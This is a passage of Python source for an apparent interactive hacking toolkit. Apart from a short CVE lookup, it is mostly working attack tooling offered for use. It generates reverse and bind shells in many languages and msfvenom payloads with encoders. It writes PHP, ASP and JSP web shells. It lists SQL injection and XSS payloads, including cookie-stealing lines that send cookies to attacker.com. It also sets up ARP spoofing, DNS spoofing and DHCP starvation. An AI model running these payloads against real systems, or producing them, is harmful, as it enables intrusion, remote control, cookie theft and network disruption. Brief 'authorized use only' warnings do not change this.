                        f.write(f"Date: {datetime.now()}\n")
                        f.write("=" * 75 + "\n\n")
                        f.write(response)
                    
                    print(f"\n{Colors.SUCCESS}✓ Analysis saved to: {output_file}{Colors.RESET}")
                
            except Exception as e:
                print(f"{Colors.ERROR}✗ Failed to retrieve information: {e}")
        else:
            print(f"{Colors.WARNING}⚠ AI features not available. Please configure API keys.")
    
    def fetch_cve_info(self, cve_id: str):
        """Fetch CVE information from NVD"""
        try:
            print(f"{Colors.INFO}▶ Fetching CVE data from NVD...")
            url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve_id}"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if 'vulnerabilities' in data and len(data['vulnerabilities']) > 0:
                    vuln = data['vulnerabilities'][0]['cve']
                    
                    print(f"\n{Colors.SUCCESS}{'=' * 75}")
                    print(f"{Colors.HEADER}CVE Information from NVD{Colors.RESET}")
                    print(f"{Colors.SUCCESS}{'=' * 75}{Colors.RESET}")
                    print(f"\n{Colors.INFO}CVE ID: {Colors.RESET}{vuln.get('id', 'N/A')}")
                    print(f"{Colors.INFO}Published: {Colors.RESET}{vuln.get('published', 'N/A')}")
                    print(f"{Colors.INFO}Last Modified: {Colors.RESET}{vuln.get('lastModified', 'N/A')}")
                    
                    if 'descriptions' in vuln:
                        desc = vuln['descriptions'][0]['value']
                        print(f"\n{Colors.INFO}Description:{Colors.RESET}")
                        print(f"  {desc}")
                    
                    if 'metrics' in vuln:
                        metrics = vuln.get('metrics', {})
                        if 'cvssMetricV31' in metrics:
                            cvss = metrics['cvssMetricV31'][0]['cvssData']
                            print(f"\n{Colors.INFO}CVSS v3.1 Score: {Colors.RESET}{cvss.get('baseScore', 'N/A')} ({cvss.get('baseSeverity', 'N/A')})")
                            print(f"{Colors.INFO}Vector: {Colors.RESET}{cvss.get('vectorString', 'N/A')}")
                    
                    print(f"{Colors.SUCCESS}{'=' * 75}{Colors.RESET}\n")
        except Exception as e:
            print(f"{Colors.WARNING}⚠ Could not fetch CVE data: {e}")
    
    # ========================================================================
    # EXPLOIT DEVELOPMENT MODULE
    # ========================================================================
    
    def exploit_menu(self):
        """Exploit development and payload generation"""
        while True:
            print(f"\n{Colors.SEPARATOR}")
            print(f"{Colors.HEADER}           💉 EXPLOIT DEVELOPMENT{Colors.RESET}")
            print(Colors.SEPARATOR)
            print(f"""
{Colors.MENU}1{Colors.RESET} - Reverse Shell Generator
{Colors.MENU}2{Colors.RESET} - Bind Shell Generator
{Colors.MENU}3{Colors.RESET} - Msfvenom Payload Generator
{Colors.MENU}4{Colors.RESET} - Web Shell Generator
{Colors.MENU}5{Colors.RESET} - SQL Injection Payloads
{Colors.MENU}6{Colors.RESET} - XSS Payloads
{Colors.MENU}7{Colors.RESET} - Back to Main Menu
""")
            print(Colors.SUBSEPARATOR)
            
            choice = input(f"{Colors.PROMPT}[+] Select option: {Colors.RESET}").strip()
            
            if choice == "1":
                self.reverse_shell_generator()
            elif choice == "2":
                self.bind_shell_generator()
            elif choice == "3":
                self.msfvenom_generator()
            elif choice == "4":
                self.web_shell_generator()
            elif choice == "5":
                self.sql_injection_payloads()
            elif choice == "6":
                self.xss_payloads()
            elif choice == "7":
                break
            else:
                print(f"{Colors.ERROR}✗ Invalid option")
    
    def reverse_shell_generator(self):
        """Generate reverse shell payloads"""
        print(f"\n{Colors.HEADER}🐚 Reverse Shell Generator{Colors.RESET}")
        
        lhost = input(f"{Colors.PROMPT}[+] Enter LHOST (your IP): {Colors.RESET}").strip()
        lport = input(f"{Colors.PROMPT}[+] Enter LPORT (your port): {Colors.RESET}").strip()
        
        if not lhost or not lport:
            print(f"{Colors.ERROR}✗ LHOST and LPORT are required")
            return
        
        shells = {
            "1": ("Bash TCP", f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
            "2": ("Bash UDP", f"bash -i >& /dev/udp/{lhost}/{lport} 0>&1"),
            "3": ("Python", f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
            "4": ("Python3", f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
            "5": ("Netcat Traditional", f"nc -e /bin/sh {lhost} {lport}"),
            "6": ("Netcat OpenBSD", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"),
            "7": ("PHP", f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
            "8": ("Ruby", f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"),
            "9": ("Perl", f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"),
            "10": ("PowerShell", f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"),
            "11": ("Java", f"r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]); p.waitFor();"),
            "12": ("Golang", f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{lhost}:{lport}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"),
            "13": ("Node.js", f"(function(){{var net = require(\"net\"), cp = require(\"child_process\"), sh = cp.spawn(\"/bin/sh\", []); var client = new net.Socket(); client.connect({lport}, \"{lhost}\", function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}}); return /a/;}})();"),
        }
        
        print(f"\n{Colors.INFO}Available Shell Types:")
        for key, (name, _) in shells.items():
            print(f"{Colors.MENU}{key.rjust(2)}{Colors.RESET} - {name}")
        
        choice = input(f"\n{Colors.PROMPT}[+] Select shell type: {Colors.RESET}").strip()
        
        if choice in shells:
            shell_name, payload = shells[choice]
            print(f"\n{Colors.SUCCESS}✓ {shell_name} Reverse Shell:")
            print(f"{Colors.HEADER}{'=' * 75}")
            print(f"{Colors.INFO}{payload}")
            print(f"{Colors.HEADER}{'=' * 75}{Colors.RESET}")
            
            # Base64 encode option
            encode = input(f"\n{Colors.PROMPT}[?] Base64 encode payload? (y/n): {Colors.RESET}").strip().lower()
            if encode == 'y':
                import base64
                encoded = base64.b64encode(payload.encode()).decode()
                print(f"\n{Colors.SUCCESS}Base64 Encoded:")
                print(f"{Colors.INFO}{encoded}{Colors.RESET}")
            
            # Save to file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"revshell_{shell_name.replace(' ', '_').lower()}_{timestamp}.txt"
            with open(output_file, 'w') as f:
                f.write(f"{shell_name} Reverse Shell\n")
                f.write(f"{'=' * 75}\n")
                f.write(f"LHOST: {lhost}\n")
                f.write(f"LPORT: {lport}\n")
                f.write(f"Generated: {datetime.now()}\n\n")
                f.write(f"Payload:\n{payload}\n")
                if encode == 'y':
                    f.write(f"\nBase64 Encoded:\n{encoded}\n")
            
            print(f"\n{Colors.SUCCESS}✓ Saved to: {output_file}{Colors.RESET}")
            
            # Listener command
            print(f"\n{Colors.INFO}Start listener with:")
            print(f"{Colors.MENU}nc -lnvp {lport}{Colors.RESET}")
        else:
            print(f"{Colors.ERROR}✗ Invalid selection")
    
    def bind_shell_generator(self):
        """Generate bind shell payloads"""
        print(f"\n{Colors.HEADER}🔗 Bind Shell Generator{Colors.RESET}")
        
        lport = input(f"{Colors.PROMPT}[+] Enter LPORT (bind port): {Colors.RESET}").strip()
        
        if not lport:
            print(f"{Colors.ERROR}✗ LPORT is required")
            return
        
        shells = {
            "1": ("Netcat Traditional", f"nc -lnvp {lport} -e /bin/bash"),
            "2": ("Netcat OpenBSD", f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -l {lport} >/tmp/f"),
            "3": ("Python", f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((\"\",{lport}));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"),
            "4": ("PHP", f"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{lport});socket_listen($s,1);$c=socket_accept($s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"),
        }
        
        print(f"\n{Colors.INFO}Available Bind Shell Types:")
        for key, (name, _) in shells.items():
            print(f"{Colors.MENU}{key}{Colors.RESET} - {name}")
        
        choice = input(f"\n{Colors.PROMPT}[+] Select shell type: {Colors.RESET}").strip()
        
        if choice in shells:
            shell_name, payload = shells[choice]
            print(f"\n{Colors.SUCCESS}✓ {shell_name} Bind Shell:")
            print(f"{Colors.HEADER}{'=' * 75}")
            print(f"{Colors.INFO}{payload}")
            print(f"{Colors.HEADER}{'=' * 75}{Colors.RESET}")
            
            # Save to file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"bindshell_{shell_name.replace(' ', '_').lower()}_{timestamp}.txt"
            with open(output_file, 'w') as f:
                f.write(f"{shell_name} Bind Shell\n")
                f.write(f"{'=' * 75}\n")
                f.write(f"LPORT: {lport}\n")
                f.write(f"Generated: {datetime.now()}\n\n")
                f.write(f"Payload:\n{payload}\n")
            
            print(f"\n{Colors.SUCCESS}✓ Saved to: {output_file}{Colors.RESET}")
            print(f"\n{Colors.INFO}Connect with:")
            print(f"{Colors.MENU}nc TARGET_IP {lport}{Colors.RESET}")
        else:
            print(f"{Colors.ERROR}✗ Invalid selection")
    
    def msfvenom_generator(self):
        """Generate msfvenom payloads"""
        if not self.check_tool_installed("msfvenom"):
            print(f"{Colors.ERROR}✗ Metasploit (msfvenom) is not installed")
            print(f"{Colors.INFO}Install: sudo apt install metasploit-framework")
            return
        
        print(f"\n{Colors.HEADER}💉 Msfvenom Payload Generator{Colors.RESET}")
        
        print(f"\n{Colors.INFO}Payload Categories:")
        print(f"{Colors.MENU}1{Colors.RESET} - Windows Payloads")
        print(f"{Colors.MENU}2{Colors.RESET} - Linux Payloads")
        print(f"{Colors.MENU}3{Colors.RESET} - Web Payloads (PHP, Python, Java)")
        print(f"{Colors.MENU}4{Colors.RESET} - Android/Mobile")
        print(f"{Colors.MENU}5{Colors.RESET} - Custom")
        
        category = input(f"\n{Colors.PROMPT}[+] Select category: {Colors.RESET}").strip()
        
        payloads = {}
        if category == "1":
            payloads = {
                "1": ("Windows Meterpreter Reverse TCP (x64)", "windows/x64/meterpreter/reverse_tcp"),
                "2": ("Windows Meterpreter Reverse HTTPS (x64)", "windows/x64/meterpreter/reverse_https"),
                "3": ("Windows Shell Reverse TCP (x64)", "windows/x64/shell_reverse_tcp"),
                "4": ("Windows Meterpreter Reverse TCP (x86)", "windows/meterpreter/reverse_tcp"),
            }
        elif category == "2":
            payloads = {
                "1": ("Linux Meterpreter Reverse TCP (x64)", "linux/x64/meterpreter/reverse_tcp"),
                "2": ("Linux Shell Reverse TCP (x64)", "linux/x64/shell_reverse_tcp"),
                "3": ("Linux Meterpreter Reverse TCP (x86)", "linux/x86/meterpreter/reverse_tcp"),
            }
        elif category == "3":
            payloads = {
                "1": ("PHP Meterpreter Reverse TCP", "php/meterpreter/reverse_tcp"),
                "2": ("Python Meterpreter Reverse TCP", "python/meterpreter/reverse_tcp"),
                "3": ("Java Meterpreter Reverse TCP", "java/meterpreter/reverse_tcp"),
                "4": ("JSP Meterpreter Reverse TCP", "java/jsp_shell_reverse_tcp"),
            }
        elif category == "4":
            payloads = {
                "1": ("Android Meterpreter Reverse TCP", "android/meterpreter/reverse_tcp"),
                "2": ("Android Meterpreter Reverse HTTPS", "android/meterpreter/reverse_https"),
            }
        
        if category in ["1", "2", "3", "4"]:
            print(f"\n{Colors.INFO}Available Payloads:")
            for key, (name, _) in payloads.items():
                print(f"{Colors.MENU}{key}{Colors.RESET} - {name}")
            
            choice = input(f"\n{Colors.PROMPT}[+] Select payload: {Colors.RESET}").strip()
            if choice in payloads:
                _, payload = payloads[choice]
            else:
                print(f"{Colors.ERROR}✗ Invalid selection")
                return
        elif category == "5":
            payload = input(f"{Colors.PROMPT}[+] Enter payload name: {Colors.RESET}").strip()
        else:
            print(f"{Colors.ERROR}✗ Invalid category")
            return
        
        lhost = input(f"{Colors.PROMPT}[+] Enter LHOST: {Colors.RESET}").strip()
        lport = input(f"{Colors.PROMPT}[+] Enter LPORT: {Colors.RESET}").strip()
        
        if not lhost or not lport:
            print(f"{Colors.ERROR}✗ LHOST and LPORT are required")
            return
        
        # Output format
        print(f"\n{Colors.INFO}Output Formats:")
        print(f"1 - EXE\n2 - ELF\n3 - APK\n4 - WAR\n5 - Python\n6 - Raw\n7 - PowerShell")
        fmt_choice = input(f"{Colors.PROMPT}[+] Select format [1-7]: {Colors.RESET}").strip()
        
        formats = {"1": "exe", "2": "elf", "3": "apk", "4": "war", "5": "py", "6": "raw", "7": "psh"}
        output_format = formats.get(fmt_choice, "raw")
        
        # Encoding option
        encode = input(f"{Colors.PROMPT}[?] Use encoding? (y/n): {Colors.RESET}").strip().lower()
        encode_flag = ""
        if encode == 'y':
            encoder = input(f"{Colors.PROMPT}[+] Enter encoder (e.g., x86/shikata_ga_nai) or press Enter for default: {Colors.RESET}").strip()
            if encoder:
                iterations = input(f"{Colors.PROMPT}[+] Encoding iterations [1-10]: {Colors.RESET}").strip() or "3"
                encode_flag = f"-e {encoder} -i {iterations}"
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"payload_{timestamp}.{output_format}"
        
        command = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} {encode_flag} -f {output_format} -o {output_file}"
        
        print(f"\n{Colors.INFO}Generating payload...")
        success, result = self.run_command(command)
        
        if success and output_file.exists():
            file_size = output_file.stat().st_size
            print(f"\n{Colors.SUCCESS}✓ Payload generated successfully")
            print(f"{Colors.SUCCESS}✓ Saved to: {output_file}")
            print(f"{Colors.INFO}✓ Size: {file_size} bytes{Colors.RESET}")
            
            # Handler setup instructions
            print(f"\n{Colors.INFO}Start Metasploit handler:")
            print(f"{Colors.MENU}msfconsole -q -x \"use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; exploit\"{Colors.RESET}")
    
    def web_shell_generator(self):
        """Generate web shells"""
        print(f"\n{Colors.HEADER}🕸️  Web Shell Generator{Colors.RESET}")
        
        shells = {
            "1": ("PHP Simple Shell", """<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>"""),
            "2": ("PHP Command Shell", """<?php
// Simple PHP Command Shell
// Access: shell.php?cmd=command
if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo '<pre>';
    $output = shell_exec($cmd);
    echo htmlspecialchars($output);
    echo '</pre>';
}
?>"""),
            "3": ("Python Web Shell", """#!/usr/bin/env python3
import os
import cgi
form = cgi.FieldStorage()
cmd = form.getvalue('cmd')
if cmd:
    print("Content-type: text/html\\n")
    print("<pre>")
    os.system(cmd)
    print("</pre>")
"""),
            "4": ("ASP Web Shell", """<%
dim cmd, output
cmd = Request.QueryString("cmd")
if cmd <> "" then
    Set objShell = Server.CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd.exe /c " & cmd)
    output = objExec.StdOut.ReadAll()
    Response.Write("<pre>" & output & "</pre>")
end if
%>"""),
            "5": ("JSP Web Shell", """<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    out.println("<pre>");
    while((line = br.readLine()) != null) {
        out.println(line);
    }
    out.println("</pre>");
}
%>"""),
        }
        
        print(f"\n{Colors.INFO}Available Web Shells:")
        for key, (name, _) in shells.items():
            print(f"{Colors.MENU}{key}{Colors.RESET} - {name}")
        
        choice = input(f"\n{Colors.PROMPT}[+] Select shell type: {Colors.RESET}").strip()
        
        if choice in shells:
            shell_name, code = shells[choice]
            
            # Determine file extension
            ext_map = {"1": "php", "2": "php", "3": "py", "4": "asp", "5": "jsp"}
            ext = ext_map.get(choice, "txt")
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = self.output_dir / f"webshell_{timestamp}.{ext}"
            
            with open(output_file, 'w') as f:
                f.write(code)
            
            print(f"\n{Colors.SUCCESS}✓ {shell_name} generated")
            print(f"{Colors.SUCCESS}✓ Saved to: {output_file}{Colors.RESET}")
            
            print(f"\n{Colors.INFO}Usage:")
            print(f"{Colors.MENU}http://target.com/shell.{ext}?cmd=whoami{Colors.RESET}")
            
            print(f"\n{Colors.WARNING}⚠ Warning: Use responsibly and only on authorized systems!")
        else:
            print(f"{Colors.ERROR}✗ Invalid selection")
    
    def sql_injection_payloads(self):
        """Generate SQL injection payloads"""
        print(f"\n{Colors.HEADER}💉 SQL Injection Payloads{Colors.RESET}")
        
        payloads = {
            "Authentication Bypass": [
                "' OR '1'='1",
                "' OR 1=1--",
                "admin' --",
                "admin' #",
                "' OR 1=1/*",
                "' OR 'a'='a",
            ],
            "Union Based": [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version--",
                "' UNION SELECT table_name FROM information_schema.tables--",
            ],
            "Error Based": [
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND 1=CONVERT(int,(SELECT user))--",
                "' AND extractvalue(1,concat(0x7e,version()))--",
            ],
            "Time Based Blind": [
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5('test'))--",
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND pg_sleep(5)--",
            ],
            "Boolean Based Blind": [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND substring(version(),1,1)='5'--",
            ],
        }
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"sqli_payloads_{timestamp}.txt"
        
        with open(output_file, 'w') as f:
            f.write("SQL Injection Payload Collection\n")
            f.write("=" * 75 + "\n")
            f.write(f"Generated: {datetime.now()}\n\n")
            
            for category, payload_list in payloads.items():
                print(f"\n{Colors.HEADER}=== {category} ==={Colors.RESET}")
                f.write(f"\n=== {category} ===\n")
                for payload in payload_list:
                    print(f"{Colors.INFO}{payload}{Colors.RESET}")
                    f.write(f"{payload}\n")
                f.write("\n")
        
        print(f"\n{Colors.SUCCESS}✓ Payloads saved to: {output_file}{Colors.RESET}")
        print(f"\n{Colors.WARNING}⚠ Use responsibly and only on authorized systems!")
    
    def xss_payloads(self):
        """Generate XSS payloads"""
        print(f"\n{Colors.HEADER}💉 XSS Payloads{Colors.RESET}")
        
        payloads = {
            "Basic XSS": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
            ],
            "DOM Based XSS": [
                "<script>document.write(location.hash.slice(1))</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<object data=javascript:alert('XSS')>",
            ],
            "Bypass Filters": [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;\">",
                "<<SCRIPT>alert('XSS');//<</SCRIPT>",
                "<svg/onload=alert('XSS')>",
            ],
            "Cookie Stealing": [
                "<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>",
                "<script>new Image().src='http://attacker.com/steal.php?c='+document.cookie</script>",
            ],
            "Stored XSS": [
                "<script>alert(document.domain)</script>",
                "\"><script>alert('XSS')</script>",
                "'><script>alert(document.cookie)</script>",
            ],
        }
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = self.output_dir / f"xss_payloads_{timestamp}.txt"
        
        with open(output_file, 'w') as f:
            f.write("XSS Payload Collection\n")
            f.write("=" * 75 + "\n")
            f.write(f"Generated: {datetime.now()}\n\n")
            
            for category, payload_list in payloads.items():
                print(f"\n{Colors.HEADER}=== {category} ==={Colors.RESET}")
                f.write(f"\n=== {category} ===\n")
                for payload in payload_list:
                    print(f"{Colors.INFO}{payload}{Colors.RESET}")
                    f.write(f"{payload}\n")
                f.write("\n")
        
        print(f"\n{Colors.SUCCESS}✓ Payloads saved to: {output_file}{Colors.RESET}")
        print(f"\n{Colors.WARNING}⚠ Use responsibly and only on authorized systems!")
    
    # ========================================================================
    # NETWORK ATTACKS MODULE
    # ========================================================================
    
    def network_attacks_menu(self):
        """Network attacks and exploitation module"""
        while True:
            print(f"\n{Colors.SEPARATOR}")
            print(f"{Colors.HEADER}           ⚡ NETWORK ATTACKS{Colors.RESET}")
            print(Colors.SEPARATOR)
            print(f"""
{Colors.WARNING}⚠ WARNING: These tools can disrupt networks. Use only on authorized systems!{Colors.RESET}

{Colors.MENU}1{Colors.RESET} - ARP Spoofing/Poisoning
{Colors.MENU}2{Colors.RESET} - DNS Spoofing
{Colors.MENU}3{Colors.RESET} - DHCP Starvation
{Colors.MENU}4{Colors.RESET} - SYN Flood (DoS)
{Colors.MENU}5{Colors.RESET} - SSL Strip Attack
{Colors.MENU}6{Colors.RESET} - Man-in-the-Middle (MITM) Setup
{Colors.MENU}7{Colors.RESET} - Network Sniffing
{Colors.MENU}8{Colors.RESET} - MAC Flooding
{Colors.MENU}9{Colors.RESET} - Back to Main Menu
""")
            print(Colors.SUBSEPARATOR)
            
            choice = input(f"{Colors.PROMPT}[+] Select option: {Colors.RESET}").strip()
            
            if choice == "1":
                self.arp_spoofing()
            elif choice == "2":
                self.dns_spoofing()
            elif choice == "3":
                self.dhcp_starvation()
            elif choice == "4":
                self.syn_flood()
            elif choice == "5":
                self.ssl_strip()
            elif choice == "6":
                self.mitm_setup()
            elif choice == "7":
                self.network_sniffing()
            elif choice == "8":
                self.mac_flooding()
            elif choice == "9":
                break
            else:
                print(f"{Colors.ERROR}✗ Invalid option")
    
    def arp_spoofing(self):
        """ARP spoofing attack setup"""
        if not self.check_tool_installed("arpspoof") and not self.check_tool_installed("ettercap"):
            print(f"{Colors.ERROR}✗ ARP spoofing tools not installed")
            print(f"{Colors.INFO}Install: sudo apt install dsniff ettercap-text-only")
            return
        
        print(f"\n{Colors.HEADER}🎭 ARP Spoofing Attack{Colors.RESET}")
        print(f"{Colors.WARNING}⚠ This will intercept network traffic. Use only on authorized networks!{Colors.RESET}\n")
        
        # Get network interface
        interface = input(f"{Colors.PROMPT}[+] Enter network interface (e.g., eth0): {Colors.RESET}").strip()
        target_ip = input(f"{Colors.PROMPT}[+] Enter target IP: {Colors.RESET}").strip()
        gateway_ip = input(f"{Colors.PROMPT}[+] Enter gateway IP: {Colors.RESET}").strip()
        
        if not all([interface, target_ip, gateway_ip]):
            print(f"{Colors.ERROR}✗ All fields are required")
            return
        
        # Select tool
        print(f"\n{Colors.INFO}Select Tool:")
        if self.check_tool_installed("arpspoof"):
            print(f"{Colors.MENU}1{Colors.RESET} - arpspoof (dsniff)")
        if self.check_tool_installed("ettercap"):
            print(f"{Colors.MENU}2{Colors.RESET} - ettercap")
        
        tool_choice = input(f"\n{Colors.PROMPT}[+] Select tool: {Colors.RESET}").strip()
        
        # Enable IP forwarding
        print(f"\n{Colors.INFO}▶ Enabling IP forwarding...")
        enable_forward = "echo 1 > /proc/sys/net/ipv4/ip_forward"
        self.run_command(enable_forward)
        
        if tool_choice == "1" and self.check_tool_installed("arpspoof"):
            print(f"\n{Colors.INFO}Starting ARP spoofing...")
            print(f"{Colors.INFO}Commands to run in separate terminals:")
            print(f"\n{Colors.MENU}Terminal 1:{Colors.RESET}")
            print(f"  sudo arpspoof -i {interface} -t {target_ip} {gateway_ip}")
            print(f"\n{Colors.MENU}Terminal 2:{Colors.RESET}")
            print(f"  sudo arpspoof -i {interface} -t {gateway_ip} {target_ip}")
            print(f"\n{Colors.MENU}Terminal 3 (Capture traffic):{Colors.RESET}")
            print(f"  sudo tcpdump -i {interface} -w capture.pcap")
            
        elif tool_choice == "2" and self.check_tool_installed("ettercap"):
            print(f"\n{Colors.INFO}Starting Ettercap MITM attack...")
            command = f"ettercap -T -q -i {interface} -M arp:remote /{target_ip}// /{gateway_ip}//"
            print(f"\n{Colors.MENU}Run this command:{Colors.RESET}")
            print(f"  sudo {command}")
        
        # Save attack configuration
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        config_file = self.output_dir / f"arp_spoof_config_{timestamp}.txt"
        with open(config_file, 'w') as f:
            f.write(f"ARP Spoofing Configuration\n")
            f.write("=" * 75 + "\n")
            f.write(f"Interface: {interface}\n")
            f.write(f"Target IP: {target_ip}\n")
            f.write(f"Gateway IP: {gateway_ip}\n")
            f.write(f"Generated: {datetime.now()}\n")
        
        print(f"\n{Colors.SUCCESS}✓ Configuration saved to: {config_file}{Colors.RESET}")
        print(f"\n{Colors.WARNING}⚠ Press Ctrl+C to stop the attack")
        print(f"{Colors.INFO}💡 Disable IP forwarding after: echo 0 > /proc/sys/net/ipv4/ip_forward{Colors.RESET}")
    
    def dns_spoofing(self):
        """DNS spoofing attack setup"""
        print(f"\n{Colors.HEADER}🔄 DNS Spoofing Attack{Colors.RESET}")
        print(f"{Colors.WARNING}⚠ This will redirect DNS queries. Use only on authorized networks!{Colors.RESET}\n")
        
        # Check for dnsspoof or ettercap
        if not self.check_tool_installed("dnsspoof") and not self.check_tool_installed("ettercap"):
            print(f"{Colors.ERROR}✗ DNS spoofing tools not installed")
            print(f"{Colors.INFO}Install: sudo apt install dsniff ettercap-text-only")
            return
        
        interface = input(f"{Colors.PROMPT}[+] Enter network interface: {Colors.RESET}").strip()
        target_domain = input(f"{Colors.PROMPT}[+] Enter target domain to spoof: {Colors.RESET}").strip()
        spoofed_ip = input(f"{Colors.PROMPT}[+] Enter IP to redirect to: {Colors.RESET}").strip()
        
        if not all([interface, target_domain, spoofed_ip]):
            print(f"{Colors.ERROR}✗ All fields are required")
            return
        
        # Create DNS spoof file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        spoof_file = self.output_dir / f"dns_spoof_{timestamp}.txt"
        
        with open(spoof_file, 'w') as f:
            f.write(f"{target_domain} A {spoofed_ip}\n")
            f.write(f"*.{target_domain} A {spoofed_ip}\n")
        
        print(f"\n{Colors.INFO}DNS spoof file created: {spoof_file}")
        print(f"\n{Colors.MENU}Run DNS spoofing with:{Colors.RESET}")
        print(f"  sudo dnsspoof -i {interface} -f {spoof_file}")
        
        print(f"\n{Colors.INFO}Or use Ettercap:")
        print(f"  1. Edit /etc/ettercap/etter.dns and add:")
        print(f"     {target_domain} A {spoofed_ip}")
        print(f"  2. Run: sudo ettercap -T -q -i {interface} -P dns_spoof -M arp ///")
        
        print(f"\n{Colors.SUCCESS}✓ Configuration saved{Colors.RESET}")
    
    def dhcp_starvation(self):
        """DHCP starvation attack"""
        print(f"\n{Colors.HEADER}💥 DHCP Starvation Attack{Colors.RESET}")
        print(f"{Colors.WARNING}⚠ This will exhaust DHCP pool. Use only on authorized networks!{Colors.RESET}\n")
        
        if not self.check_tool_installed("yersinia"):
            print(f"{Colors.ERROR}✗ Yersinia is not installed")
            print(f"{Colors.INFO}Install: sudo apt install yersinia")
            return
        
        interface = input(f"{Colors.PROMPT}[+] Enter network interface: {Colors.RESET}").strip()
        
        if not interface:
            print(f"{Colors.ERROR}✗ Interface is required")
            return
        
        print(f"\n{Colors.INFO}Starting DHCP starvation attack...")
        print(f"\n{Colors.MENU}Run this command:{Colors.RESET}")
        print(f"  sudo yersinia dhcp -attack 1 -interface {interface}")
        
        print(f"\n{Colors.INFO}Alternative using Scapy (Python):")
        script_path = self.output_dir / "dhcp_starvation.py"
        
        script_content = f"""#!/usr/bin/env python3
from scapy.all import *
import random

def dhcp_starvation(interface):
    while True:
        # Generate random MAC
        mac = ':'.join(['%02x'%random.randint(0,255) for _ in range(6)])
        
        # Create DHCP Discover packet
        pkt = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
